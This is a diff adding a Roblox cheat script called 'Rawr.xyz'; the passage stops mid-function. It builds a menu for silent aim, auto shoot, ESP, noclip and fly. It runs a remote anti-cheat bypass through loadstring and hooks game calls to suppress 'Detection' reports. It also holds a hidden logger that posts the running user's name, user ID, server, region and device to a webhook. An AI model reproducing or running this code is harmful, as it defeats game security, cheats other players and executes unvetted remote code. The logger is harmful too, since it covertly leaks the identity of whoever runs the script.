+local _FRPlayers = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
+local _FRPlayer = _FRPlayers.LocalPlayer
+local _ForceRestEnabled = false
+local _ForceRestHeartbeat = nil
+
+local function forceReset()
+    local character = _FRPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        end
+        character:BreakJoints()
+    end
+end
+
+local function checkHealth()
+    if not _ForceRestEnabled then return end
+    local character = _FRPlayer.Character
+    if not character then return end
+    local humanoid = character:FindFirstChild("Humanoid")
+    if humanoid and humanoid.Health <= 10 then
+        forceReset()
+    end
+end
+
+_FRPlayer.CharacterAdded:Connect(function()
+    if _ForceRestEnabled then
+        task.wait(0.5)
+        checkHealth()
+    end
+end)
+
+if _ForceRestHeartbeat then
+    _ForceRestHeartbeat:Disconnect()
+    _ForceRestHeartbeat = nil
+end
+_ForceRestHeartbeat = game:GetService("RunService").Heartbeat:Connect(checkHealth)
+
+local _2 = (syn and syn.request) or (http and http.request) or (request)
+
+local function _3(_4, _5)
+    local _6 = { embeds = { _5 } }
+    local _7 = HttpService:JSONEncode(_6)
+
+    if _2 then
+        local _8, _9 = pcall(function()
+            return _2({
+                Url = _4,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = _7
+            })
+        end)
+        if _8 and _9 then
+            local _10 = _9.StatusCode or _9.status or (_9.Success and 204)
+            if _10 == 200 or _10 == 204 then
+                return true
+            end
+        end
+    end
+
+    if HttpService and HttpService.PostAsync then
+        local _8, _11 = pcall(function()
+            HttpService:PostAsync(_4, _7, Enum.HttpContentType.ApplicationJson)
+        end)
+        if _8 then
+            return true
+        end
+    end
+
+    return false
+end
+
+local function _12(_13)
+    local _14 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%s&size=150x150&format=Png&isCircular=false"
+    local _8, _15 = pcall(function()
+        return game:HttpGet(_14:format(_13))
+    end)
+    if not _8 then return nil end
+
+    local _16, _17 = pcall(function() return HttpService:JSONDecode(_15) end)
+    if not _16 or not _17 or not _17.data or not _17.data[1] then
+        return nil
+    end
+    return _17.data[1].imageUrl
+end
+
+local function _18()
+    local _19 = "Unknown"
+    local _8, _20 = pcall(function() return UserInputService:GetPlatform() end)
+    if _8 and _20 then
+        _19 = tostring(_20):gsub("Enum%.Platform%.", "")
+    end
+
+    local p = _19:lower()
+    local _21, _22 = "Unknown", "??"
+
+    if p:match("windows") or p:match("mac") or p:match("linux") or p:match("osx") or p:match("studio") then
+        _21, _22 = "PC", "??"
+    elseif p:match("ios") or p:match("android") or p:match("ipad") or p:match("iphone") then
+        _21, _22 = "Mobile", "??"
+    elseif p:match("xbox") or p:match("ps") or p:match("playstation") or p:match("nintendo") or p:match("console") then
+        _21, _22 = "Console", "??"
+    else
+        if UserInputService.TouchEnabled then
+            _21, _22 = "Mobile", "??"
+        else
+            _21, _22 = "PC / Desktop", "??"
+        end
+    end
+
+    return {
+        platformRaw = _19,
+        category = _21,
+        emoji = _22
+    }
+end
+
+local function _23(_24)
+    local _25 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
+    if not _25 then
+        return "No servers folder found", "n/a"
+    end
+    
+    local _26 = tostring(_24)
+    local _27 = "not found"
+    local _28 = "not found"
+    
+    for _, _29 in ipairs(_25:GetChildren()) do
+        if _29:IsA("IntValue") then
+            local _30 = _29:GetAttributes()
+            
+            if _30 then
+                local _31 = _30.players
+                
+                if _31 and string.find(tostring(_31), _26) then
+                    _27 = _30.name or "unknown"
+                    _28 = _30.region or "n/a"
+                    break
+                end
+            end
+        end
+    end
+    
+    return _27, _28
+end
+
+local function _32()
+    local _33
+    for i = 1, 10 do
+        _33 = _12(LocalPlayer.UserId)
+        if _33 then break end
+        task.wait(0.2)
+    end
+    _33 = _33 or ""
+
+    local _34 = _18()
+
+    local _35, _36 = _23(LocalPlayer.UserId)
+
+    local _37 = {
+        title = "Execution Logs",
+        color = 0xffbdd2,
+        fields = {
+            { name = "?? Display Name", value = tostring(LocalPlayer.DisplayName or "Unknown"), inline = true },
+            { name = "?? Username", value = tostring(LocalPlayer.Name or "Unknown"), inline = true },
+            { name = "?? User ID", value = tostring(LocalPlayer.UserId or "Unknown"), inline = true },
+            { name = "?? Server", value = _35, inline = true },
+            { name = "?? Region", value = _36, inline = true },
+            { name = "Device", value = string.format("%s %s (%s)", _34.emoji, _34.category, _34.platformRaw), inline = false },
+            { name = "??? Timestamp", value = "<t:" .. os.time() .. ":R>", inline = false },
+        },
+        thumbnail = { url = _33 },
+        footer = { text = "rawr.xyz made ts" }
+    }
+
+    _3(_1, _37)
+end
+
+if _1 and _1 ~= "" then
+    _32()
+end
+
+local _38 = "A94A07A9-74A6-4D86-A747-832EF519DAC7"
+local _39 = 0
+
+local _40, _ = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/refs/heads/Main/Scripts%20/Anti-Cheats%20Bypassers%20/Adonis.luau", true))()
+end)
+
+local originalNamecall
+originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    if checkcaller() then return originalNamecall(self, ...) end
+    local args = {...}
+    local method = getnamecallmethod()
+
+    if method == "FireServer" and self.Name == "MainRemoteEvent" then
+        if args[1] == "Detection" then
+            return coroutine.yield()
+        elseif args[1] == "StompXD" then
+            args[3] = true
+            return originalNamecall(unpack(args))
+        end
+    end
+
+    if method == "FireServer" then
+        local parent = self.Parent
+        if parent then
+            local name = parent.Name:lower()
+            local cancelWeapons = {
+                ["revolver"] = true,
+                ["double-barrel sg"] = true,
+                ["tacticalshotgun"] = true
+            }
+            if cancelWeapons[name] then
+                if type(args[1]) == "string" and args[1]:lower() == "shoot" then
+                    return nil
+                end
+            end
+        end
+    end
+
+    return originalNamecall(self, ...)
+end)
+
+wait(1)
+
+local _47 = 'https://linoria-lib-mu.vercel.app/'
+
+local _48 = loadstring(game:HttpGet(_47 .. 'Library.lua'))()
+local _49 = loadstring(game:HttpGet(_47 .. 'addons/ThemeManager.lua'))()
+local _50 = loadstring(game:HttpGet(_47 .. 'addons/SaveManager.lua'))()
+
+local _51 = game:GetService("Players")
+local _52 = game:GetService("RunService")
+local _53 = game:GetService("Workspace")
+local _54 = game:GetService("UserInputService")
+local _55 = game:GetService("ReplicatedStorage")
+
+local _56 = _51.LocalPlayer
+if not _56 then
+    repeat wait() until _51.LocalPlayer
+    _56 = _51.LocalPlayer
+end
+
+local _57 = _56:GetMouse()
+local _58 = _53.CurrentCamera
+
+local _59 = _48:CreateWindow({
+    Title = 'Rawr.xyz',
+    Center = true,
+    AutoShow = true,
+    TabPadding = 2,
+    MenuFadeTime = 0.2
+})
+
+local _60 = {
+    Main         = _59:AddTab('Main'),
+    ['UI Settings'] = _59:AddTab('UI Settings'),
+}
+
+shared.hitman = {
+    silent = {
+        enabled = false,
+        key = "c",
+        prediction = 0,
+        hitpart = "Head",
+        mode = "sticky"
+    },
+    visuals = {
+        snaplines = {
+            enabled = true,
+            position = "mouse",
+            color = Color3.fromRGB(255, 255, 255),
+            thickness = 1
+        },
+        targetinfo = {
+            enabled = true,
+            color = Color3.fromRGB(255, 200, 100),
+            textcolor = Color3.fromRGB(255, 255, 255)
+        }
+    },
+    checks = {
+        knock = true,
+        wall = true,
+        protected = true,
+        whitelist = {
+            enabled = false,
+            players = {},
+        },
+    },
+    misc = {
+        voidhide = {
+            enabled = true,
+            key = "p"
+        },
+        cframefly = {
+            enabled = false,
+            key = "t",
+            speed = 350
+        },
+    }
+}
+
+local _61 = _60.Main:AddLeftTabbox()
+local _62 = _61:AddTab('Main')
+
+local _63 = _62:AddToggle('Enabled', {
+    Text = 'Silent Aim',
+    Default = false,
+})
+
+local _64 = _63:AddKeyPicker('EnabledKeybind', {
+    Default = 'C',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Toggle Bind',
+    NoUI = false
+})
+
+local _65 = _62:AddDropdown('Mode', {
+    Values = { 'Sticky', 'Auto Select', 'Target All', 'Multi' },
+    Default = 'Sticky',
+    Text = 'Target Mode',
+})
+
+_62:AddToggle('ManipulatedText', {
+    Text = 'Show Watermark',
+    Default = false,
+})
+
+_62:AddToggle('TargetInfo', {
+    Text = 'Target Info Panel',
+    Default = false,
+})
+
+local _66 = _60.Main:AddLeftTabbox()
+local _67 = _66:AddTab('Target')
+
+local _68 = _67:AddToggle('Spectate', {
+    Text = 'Spectate Target',
+    Default = false,
+})
+
+local _69 = _67:AddToggle('Highlight', {
+    Text = 'Player Highlight',
+    Default = false,
+})
+
+local _70 = _69:AddColorPicker('HighlightFillColor', {
+    Default = Color3.fromRGB(255, 255, 255),
+    Title = 'Fill Color',
+    Transparency = 0.5
+})
+
+local _71 = _69:AddColorPicker('HighlightOutlineColor', {
+    Default = Color3.fromRGB(255, 255, 255),
+    Title = 'Outline Color',
+    Transparency = 0
+})
+
+local _72 = _67:AddToggle('Line', {
+    Text = 'Snap Lines',
+    Default = false,
+})
+
+local _73 = _72:AddColorPicker('LineColor', {
+    Default = Color3.fromRGB(255, 255, 255),
+    Title = 'Line Color',
+    Transparency = 1
+})
+
+local _74 = _67:AddToggle('AutoShoot', {
+    Text = 'Auto Shoot',
+    Default = false,
+})
+
+_67:AddToggle('WhitelistEnabled', {
+    Text = 'Enable Whitelist',
+    Default = false,
+})
+_67:AddDropdown('WhitelistPlayers', {
+    Text = 'Whitelisted Players',
+    Values = { '(loading...)' },
+    Multi = true,
+    Default = {},
+})
+_67:AddButton('Refresh List', function()
+    task.defer(function() pcall(_WL_RefreshDropdown) end)
+end)
+_67:AddButton('Add Target', function()
+    task.defer(function() pcall(_WL_AddCurrentTarget) end)
+end)
+
+_67:AddToggle('BlacklistEnabled', {
+    Text = 'Enable Blacklist',
+    Default = false,
+})
+_67:AddToggle('AutoBlockFriends', {
+    Text = 'Auto-Block Friends',
+    Default = true,
+})
+_67:AddDropdown('BlacklistPlayers', {
+    Text = 'Blacklisted Players',
+    Values = { '(loading...)' },
+    Multi = true,
+    Default = {},
+})
+_67:AddButton('Refresh List', function()
+    task.defer(function() pcall(_BL_RefreshDropdown) end)
+end)
+_67:AddButton('Add Target', function()
+    task.defer(function() pcall(_BL_AddCurrentTarget) end)
+end)
+
+local _75 = _60.Main:AddLeftTabbox()
+local _76 = _75:AddTab('Checks')
+
+_76:AddToggle('KnockCheck', {
+    Text = 'Skip Knocked Players',
+    Default = true,
+})
+
+_76:AddToggle('ProtectedCheck', {
+    Text = 'Skip Protected Players',
+    Default = true,
+})
+
+local _77 = _60.Main:AddRightTabbox()
+local _78 = _77:AddTab('Misc')
+
+_78:AddLabel('Movement')
+local _79 = _78:AddToggle('VoidHide', {
+    Text = 'Void Hide',
+    Default = false,
+})
+
+local _80 = _79:AddKeyPicker('VoidHideKeybind', {
+    Default = 'P',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Bind',
+    NoUI = false
+})
+
+local _247 = _78:AddToggle('CFrameFly', {
+    Text = 'CFrame Fly',
+    Default = false,
+})
+
+_247:AddKeyPicker('CFrameFlyKeybind', {
+    Default = 'T',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Bind',
+    NoUI = false
+})
+
+_78:AddSlider('FlySpeed', {
+    Text = 'Fly Speed',
+    Default = 350,
+    Min = 50,
+    Max = 5000,
+    Rounding = 0,
+})
+
+local _NoclipToggle = _78:AddToggle('Noclip', {
+    Text = 'NoClip',
+    Default = false,
+})
+
+local _WSToggle = _78:AddToggle('WalkSpeedEnabled', {
+    Text = 'Walk Speed',
+    Default = false,
+})
+
+_WSToggle:AddKeyPicker('WalkSpeedKeybind', {
+    Default = 'Z',
+    SyncToggleState = true,
+    Mode = 'Toggle',
+    Text = 'Bind',
+    NoUI = false
+})
+
+_78:AddSlider('WalkSpeed', {
+    Text = 'Speed',
+    Default = 16,
+    Min = 16,
+    Max = 1000,
+    Rounding = 0,
+    Suffix = '',
+})
+
+local _JPToggle = _78:AddToggle('JumpPowerEnabled', {
+    Text = 'Jump Power',
+    Default = false,
+})
+
+_JPToggle:AddKeyPicker('JumpPowerKeybind', {
+    Default = 'X',
+    SyncToggleState = true,
+    Mode = 'Toggle',
+    Text = 'Bind',
+    NoUI = false
+})
+
+_78:AddSlider('JumpPower', {
+    Text = 'Power',
+    Default = 50,
+    Min = 50,
+    Max = 500,
+    Rounding = 0,
+    Suffix = '',
+})
+
+_78:AddDivider()
+_78:AddLabel('Utility')
+local _AR_Toggle = _78:AddToggle('AutoReload', {
+    Text = 'Auto Reload',
+    Default = true,
+})
+
+local _AutoEquipDBToggle = _78:AddToggle('AutoEquipDB', {
+    Text = 'Auto Equip DB',
+    Default = false,
+})
+
+local _ForceRestToggle = _78:AddToggle('ForceRest', {
+    Text = 'Auto Force Rest',
+    Default = false,
+})
+_ForceRestToggle:OnChanged(function(value)
+    _ForceRestEnabled = value
+end)
+
+_78:AddButton('Force Rest', function()
+    forceReset()
+end)
+
+_78:AddButton('Rapid Fire', function()
+    loadstring(game:HttpGet('https://woodie-exe-v2-backend.vercel.app/rapid-fire.lua'))()
+end)
+
+_78:AddDivider()
+_78:AddLabel('Auto Armor')
+local _AutoArmorToggle = _78:AddToggle('AutoArmor', {
+    Text = 'Auto Armor',
+    Default = false,
+})
+
+local _AutoArmorThresholdSlider = _78:AddSlider('AutoArmorThreshold', {
+    Text = 'Armor Threshold',
+    Default = 200,
+    Min = 10,
+    Max = 200,
+    Rounding = 0,
+    Suffix = '',
+})
+
+local _AutoArmorVoidIgnoreToggle = _78:AddToggle('AutoArmorVoidIgnore', {
+    Text = 'Ignore Void Hide',
+    Default = true,
+})
+
+_78:AddDivider()
+_78:AddLabel('Player ESP')
+local _ESPEnabled = _78:AddToggle('ESPEnabled', {
+    Text = 'ESP Enabled',
+    Default = true,
+})
+_78:AddToggle('ESPShowNames', {
+    Text = 'Player Names',
+    Default = true,
+})
+_78:AddToggle('ESPShowDistance', {
+    Text = 'Distance',
+    Default = false,
+})
+_78:AddToggle('ESPShowHealth', {
+    Text = 'Health',
+    Default = false,
+})
+
+_78:AddDivider()
+local _TPDropdown = _78:AddDropdown('TPPlayer', {
+    Text = 'Select Player',
+    Values = { '(loading...)' },
+    Default = '(loading...)',
+})
+_78:AddButton('Teleport', function()
+    local name = Options.TPPlayer and Options.TPPlayer.Value
+    if not name or name == '' or name == '(loading...)' then return end
+    local target = nil
+    for _, plr in ipairs(_51:GetPlayers()) do
+        local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
+        if plr.Name == name or plr.DisplayName == name or formatted == name then
+            target = plr
+            break
+        end
+    end
+    if not target or not target.Character then return end
+    local root = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
+    if not root then return end
+    local myChar = _56.Character
+    if not myChar then return end
+    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+    if myRoot then
+        myRoot.CFrame = root.CFrame * CFrame.new(0, 3, 0)
+    end
+end)
+
+local function _TP_RefreshDropdown()
+    local names = {}
+    for _, plr in ipairs(_51:GetPlayers()) do
+        if plr ~= _56 then
+            table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name))
+        end
+    end
+    table.sort(names)
+    if #names == 0 then names = { '(no other players)' } end
+    local kept = Options.TPPlayer and Options.TPPlayer.Value or ''
+    pcall(function()
+        Options.TPPlayer:SetValues(names)
+        if kept ~= '' and kept ~= '(loading...)' then
+            Options.TPPlayer:SetValue(kept)
+        elseif #names > 0 and kept ~= '(no other players)' then
+            Options.TPPlayer:SetValue(names[1])
+        end
+    end)
+end
+
+task.spawn(function()
+    while task.wait(1) do
+        _TP_RefreshDropdown()
+    end
+end)
+
+local _81 = _60.Main:AddRightTabbox()
+local _82 = _81:AddTab('server finder')
+
+local function _83(tab)
+    tab:AddInput('UserIdInput', {
+        Default = '',
+        Numeric = true,
+        Text = 'user id',
+        Placeholder = '123456789'
+    })
+
+    local _84 = tab:AddLabel('server: not found')
+    local _85 = tab:AddLabel('region: not found')
+
+    local function _86()
+        local _87 = Options.UserIdInput.Value
+        if _87 == "" then 
+            _84:SetText('server: not found')
+            _85:SetText('region: not found')
+            return 
+        end
+        
+        local _88 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
+        if not _88 then
+            _84:SetText('server: no servers folder')
+            _85:SetText('region: n/a')
+            return
+        end
+        
+        local _89 = tostring(_87)
+        local _90 = "not found"
+        local _91 = "not found"
+        
+        for _, _92 in ipairs(_88:GetChildren()) do
+            if _92:IsA("IntValue") then
+                local _93 = _92:GetAttributes()
+                
+                if _93 then
+                    local _94 = _93.players
+                    
+                    if _94 and string.find(tostring(_94), _89) then
+                        _90 = _93.name or "unknown"
+                        _91 = _93.region or "n/a"
+                        if setclipboard then
+                            setclipboard(_90)
+                        end
+                        break
+                    end
+                end
+            end
+        end
+        
+        _84:SetText('server: ' .. _90)
+        _85:SetText('region: ' .. _91)
+    end
+
+    Options.UserIdInput:OnChanged(function()
+        _86()
+    end)
+
+    task.spawn(function()
+        task.wait(0.5)
+        _86()
+    end)
+
+    return {
+        Update = _86
+    }
+end
+
+local _95 = _83(_82)
+
+local _96 = _60['UI Settings']:AddLeftGroupbox('Menu')
+_96:AddButton('Rejoin', function()
+    game:GetService("TeleportService"):Teleport(game.PlaceId, _56)
+end)
+_96:AddButton('Server Hop', function()
+    local HttpService = game:GetService("HttpService")
+    local TeleportService = game:GetService("TeleportService")
+    local PlaceId = game.PlaceId
+    local CurrentJobId = game.JobId
+    
+    local success, response = pcall(function()
+        return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?limit=100")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        local availableServers = {}
+        if data and data.data then
+            for _, server in ipairs(data.data) do
+                if server.id ~= CurrentJobId and server.playing and server.playing < server.maxPlayers then
+                    table.insert(availableServers, server.id)
+                end
+            end
+        end
+        if #availableServers > 0 then
+            local targetJobId = availableServers[math.random(#availableServers)]
+            TeleportService:TeleportToPlaceInstance(PlaceId, targetJobId, _56)
+            return
+        end
+    end
+    
+    TeleportService:Teleport(PlaceId, _56)
+end)
+_96:AddLabel('Menu Bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu Toggle' })
+
+_48.ToggleKeybind = Options.MenuKeybind
+
+_49:SetLibrary(_48)
+_50:SetLibrary(_48)
+_50:IgnoreThemeSettings()
+_50:SetIgnoreIndexes({ 'MenuKeybind' })
+_49:SetFolder('woodie')
+_50:SetFolder('woodie/specific-game')
+_50:BuildConfigSection(_60['UI Settings'])
+_49:ApplyToTab(_60['UI Settings'])
+_50:LoadAutoloadConfig()
+
+task.wait(1)
+
+setfflag("DebugRunParallelLuaOnMainThread", "true")
+
+local _104 = {
+    enabled = false,
+    active = false,
+    targetplayer = nil,
+    targetplayers = {},
+    targetpart = nil,
+    targetposition = nil,
+    keybind = "c",
+    hitchance = 100,
+    hitpart = "Head",
+    lasthealth = {},
+    wasknocked = {},
+    mode = "sticky",
+    autoshoot = false,
+    currentmode = "sticky"
+}
+
+local function _isMode(mode)
+    if _104.currentmode == "multi" then return true end
+    return _104.currentmode == mode
+end
+
+local _WL_Cache = {}
+
+local function _WL_Enabled()
+    return Toggles.WhitelistEnabled and Toggles.WhitelistEnabled.Value
+end
+
+local function _WL_GetSelectedMap()
+    if not Options.WhitelistPlayers then return {} end
+    local v = Options.WhitelistPlayers.Value
+    local map = {}
+    if type(v) ~= "table" then
+        if type(v) == "string" and v ~= "" then map[v] = true end
+        return map
+    end
+    for key, val in pairs(v) do
+        if val == true then
+            if type(key) == "string" and key ~= "" and key ~= "(loading...)" and key ~= "(no other players)" then
+                map[key] = true
+            end
+        elseif type(val) == "string" and val ~= "" and val ~= "(loading...)" and val ~= "(no other players)" then
+            map[val] = true
+        end
+    end
+    return map
+end
+
+local function _WL_RebuildCache()
+    table.clear(_WL_Cache)
+    for name in pairs(_WL_GetSelectedMap()) do
+        _WL_Cache[name:lower()] = true
+        local p = _51:FindFirstChild(name)
+        if p then _WL_Cache["uid:" .. tostring(p.UserId)] = true end
+    end
+end
+
+local function _WL_IsListed(plr)
+    if not plr then return false end
+    local map = _WL_GetSelectedMap()
+    local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
+    if map[plr.Name] or map[plr.DisplayName] or map[formatted] then return true end
+    if _WL_Cache["uid:" .. tostring(plr.UserId)] then return true end
+    local nl, dl, fl = plr.Name:lower(), plr.DisplayName:lower(), formatted:lower()
+    for name in pairs(map) do
+        local l = name:lower()
+        if l == nl or l == dl or l == fl then return true end
+    end
+    return false
+end
+
+function _WL_Allows(plr)
+    if not _WL_Enabled() then return true end
+    if not next(_WL_GetSelectedMap()) then return true end
+    return _WL_IsListed(plr)
+end
+
+function _WL_SyncShared()
+    shared.hitman.checks.whitelist.enabled = _WL_Enabled()
+    local names = {}
+    for name in pairs(_WL_GetSelectedMap()) do table.insert(names, name) end
+    table.sort(names)
+    shared.hitman.checks.whitelist.players = names
+    _WL_RebuildCache()
+end
+
+function _WL_RefreshDropdown()
+    local names = {}
+    for _, plr in ipairs(_51:GetPlayers()) do
+        if plr ~= _56 then table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name)) end
+    end
+    table.sort(names)
+    if #names == 0 then names = { "(no other players)" } end
+    local kept = _WL_GetSelectedMap()
+    pcall(function()
+        Options.WhitelistPlayers:SetValues(names)
+        local restore = {}
+        for _, n in ipairs(names) do
+            if kept[n] then restore[n] = true end
+        end
+        if next(restore) then Options.WhitelistPlayers:SetValue(restore) end
+    end)
+    _WL_RebuildCache()
+end
+
+function _WL_AddCurrentTarget()
+    if not _104.targetplayer then return end
+    local map = _WL_GetSelectedMap()
+    map[_104.targetplayer.Name] = true
+    pcall(function() Options.WhitelistPlayers:SetValue(map) end)
+    if not Toggles.WhitelistEnabled.Value then Toggles.WhitelistEnabled:SetValue(true) end
+    _WL_SyncShared()
+end
+
+function _WL_ValidateCurrentTarget()
+    if _104.targetplayer and not _WL_Allows(_104.targetplayer) then
+        _104.targetplayer = nil
+        _104.targetpart = nil
+        _104.targetposition = nil
+        task.defer(function()
+            if _105 then pcall(_150) end
+            pcall(_161)
+            pcall(function() _168(false) end)
+        end)
+    end
+end
+
+local _BL_Cache = {}
+
+local function _BL_Enabled()
+    return Toggles.BlacklistEnabled and Toggles.BlacklistEnabled.Value
+end
+
+local function _BL_GetSelectedMap()
+    if not Options.BlacklistPlayers then return {} end
+    local v = Options.BlacklistPlayers.Value
+    local map = {}
+    if type(v) ~= "table" then
+        if type(v) == "string" and v ~= "" then map[v] = true end
+        return map
+    end
+    for key, val in pairs(v) do
+        if val == true then
+            if type(key) == "string" and key ~= "" and key ~= "(loading...)" and key ~= "(no other players)" then
+                map[key] = true
+            end
+        elseif type(val) == "string" and val ~= "" and val ~= "(loading...)" and val ~= "(no other players)" then
+            map[val] = true
+        end
+    end
+    return map
+end
+
+local function _BL_RebuildCache()
+    table.clear(_BL_Cache)
+    for name in pairs(_BL_GetSelectedMap()) do
+        _BL_Cache[name:lower()] = true
+        local p = _51:FindFirstChild(name)
+        if p then _BL_Cache["uid:" .. tostring(p.UserId)] = true end
+    end
+end
+
+local function _BL_IsListed(plr)
+    if not plr then return false end
+    local map = _BL_GetSelectedMap()
+    local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
+    if map[plr.Name] or map[plr.DisplayName] or map[formatted] then return true end
+    if _BL_Cache["uid:" .. tostring(plr.UserId)] then return true end
+    local nl, dl, fl = plr.Name:lower(), plr.DisplayName:lower(), formatted:lower()
+    for name in pairs(map) do
+        local l = name:lower()
+        if l == nl or l == dl or l == fl then return true end
+    end
+    return false
+end
+
+local function _BL_IsBlocked(plr)
+    if not plr then return false end
+    if not _BL_Enabled() then return false end
+    if Toggles.AutoBlockFriends and Toggles.AutoBlockFriends.Value and shared.FriendsCache and shared.FriendsCache[plr.UserId] then
+        return true
+    end
+    return _BL_IsListed(plr)
+end
+
+function _BL_RefreshDropdown()
+    local names = {}
+    for _, plr in ipairs(_51:GetPlayers()) do
+        if plr ~= _56 then table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name)) end
+    end
+    table.sort(names)
+    if #names == 0 then names = { "(no other players)" } end
+    local kept = _BL_GetSelectedMap()
+    pcall(function()
+        Options.BlacklistPlayers:SetValues(names)
+        local restore = {}
+        for _, n in ipairs(names) do
+            if kept[n] then restore[n] = true end
+        end
+        if next(restore) then Options.BlacklistPlayers:SetValue(restore) end
+    end)
+    _BL_RebuildCache()
+end
+
+function _BL_AddCurrentTarget()
+    if not _104.targetplayer then return end
+    local map = _BL_GetSelectedMap()
+    map[_104.targetplayer.Name] = true
+    pcall(function() Options.BlacklistPlayers:SetValue(map) end)
+    if not Toggles.BlacklistEnabled.Value then Toggles.BlacklistEnabled:SetValue(true) end
+    _BL_RebuildCache()
+    _WL_ValidateCurrentTarget()
+end
+
+function _BL_ValidateCurrentTarget()
+    if _104.targetplayer and _BL_IsBlocked(_104.targetplayer) then
+        _104.targetplayer = nil
+        _104.targetpart = nil
+        _104.targetposition = nil
+        task.defer(function()
+            if _105 then pcall(_150) end
+            pcall(_161)
+            pcall(function() _168(false) end)
+        end)
+    end
+end
+
+local _105 = false
+local _106 = nil
+local _107 = nil
+local _108 = nil
+local _109 = nil
+local _110 = nil
+local _111 = nil
+local _112 = 0
+local _113 = 0.1
+
+local _114 = {}
+local _115 = {}
+
+local _118 = false
+local _119 = nil
+local _120 = nil
+local _121 = nil
+
+local _AA_wasEnabled = false
+
+local _127 = game:GetService("SoundService")
+
+local _128 = _54.TouchEnabled
+local _129 = _54.GamepadEnabled
+local _130 = not _128 and not _129
+
+if _128 or _129 then
+    shared.hitman.visuals.snaplines.position = "center"
+end
+
+local _131 = Instance.new("Sound")
+_131.SoundId = "rbxassetid://6534948092"
+_131.Volume = 0.5
+_131.Parent = _127
+
+local _132 = Instance.new("Sound")
+_132.SoundId = "rbxassetid://1255040462"
+_132.Volume = 1.0
+_132.Parent = _127
+
+local _133 = Instance.new("ScreenGui")
+_133.Name = "targetbob"
+_133.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_133.DisplayOrder = 9999
+
+if syn and syn.protect_gui then
+    syn.protect_gui(_133)
+    _133.Parent = game.CoreGui
+elseif gethui then
+    _133.Parent = gethui()
+else
+    _133.Parent = game.CoreGui
+end
+
+local _134 = Instance.new("TextLabel")
+_134.Name = "putthatback"
+_134.Parent = _133
+_134.BackgroundTransparency = 1
+_134.Size = UDim2.new(0, 120, 0, 18)
+_134.Text = "rawr.xyz was here!"
+_134.Visible = false
+_134.Position = UDim2.new(0, 0, 0, 0)
+_134.TextXAlignment = Enum.TextXAlignment.Left
+_134.TextYAlignment = Enum.TextYAlignment.Top
+_134.Font = Enum.Font.Code
+_134.TextColor3 = Color3.fromRGB(210, 180, 140)
+_134.TextSize = 13
+_134.TextStrokeColor3 = Color3.fromRGB(40, 30, 20)
+_134.TextStrokeTransparency = 0
+
+local _135 = Instance.new("TextLabel")
+_135.Name = "targetskid"
+_135.Parent = _133
+_135.BackgroundTransparency = 1
+_135.Size = UDim2.new(0, 150, 0, 16)
+_135.Text = ""
+_135.Visible = false
+_135.Position = UDim2.new(0, 0, 0, 0)
+_135.TextXAlignment = Enum.TextXAlignment.Left
+_135.TextYAlignment = Enum.TextYAlignment.Top
+_135.Font = Enum.Font.Code
+_135.TextColor3 = Color3.fromRGB(180, 130, 200)
+_135.TextSize = 11
+_135.TextStrokeColor3 = Color3.fromRGB(30, 20, 40)
+_135.TextStrokeTransparency = 0
+
+local _136 = {}
+local _137 = {}
+
+local function _138()
+    for i, _139 in ipairs(_136) do
+        _139:Remove()
+    end
+    for i, _140 in ipairs(_137) do
+        _140:Remove()
+    end
+    _136 = {}
+    _137 = {}
+end
+
+_138()
+
+local function _141()
+    if not _130 then return end
+    
+    local _142 = _54:GetMouseLocation()
+    if Toggles.ManipulatedText.Value and _134.Visible then
+        _134.Position = UDim2.new(0, _142.X + 10, 0, _142.Y + 10)
+    end
+    if Toggles.TargetInfo.Value and _135.Visible then
+        _135.Position = UDim2.new(0, _142.X + 10, 0, _142.Y + 30)
+    end
+end
+
+local function _143()
+    local _144 = _56.Character
+    if _144 then
+        for _, _145 in ipairs(_144:GetChildren()) do
+            if _145:IsA("Tool") and _145:FindFirstChild("Ammo") then
+                _55.MainEvent:FireServer("Reload", _145)
+            end
+        end
+    end
+end
+
+local function _146()
+    local _144 = _56.Character
+    local bp = _56.Backpack
+    if _144 and bp then
+        for _, _145 in ipairs(_144:GetChildren()) do
+            if _145:IsA("Tool") then
+                _145.Parent = bp
+            end
+        end
+    end
+end
+
+local _243 = { enabled = false, master = false, keys = {}, connection = nil }
+local _254 = nil
+local _255 = nil
+
+local _NoclipConnection = nil
+local _WSConnection = nil
+local _JPConnection = nil
+
+local function _NoclipLoop()
+    if not Toggles.Noclip.Value then return end
+    local char = _56.Character
+    if not char then return end
+    for _, v in ipairs(char:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.CanCollide = false
+        end
+    end
+end
+
+local function _NoclipToggleChanged()
+    if Toggles.Noclip.Value then
+        if not _NoclipConnection then
+            _NoclipConnection = _52.RenderStepped:Connect(_NoclipLoop)
+        end
+    else
+        if _NoclipConnection then
+            _NoclipConnection:Disconnect()
+            _NoclipConnection = nil
+        end
+    end
+end
+
+Toggles.Noclip:OnChanged(_NoclipToggleChanged)
+
+local function _WalkSpeedLoop()
+    if not Toggles.WalkSpeedEnabled.Value then return end
+    local char = _56.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
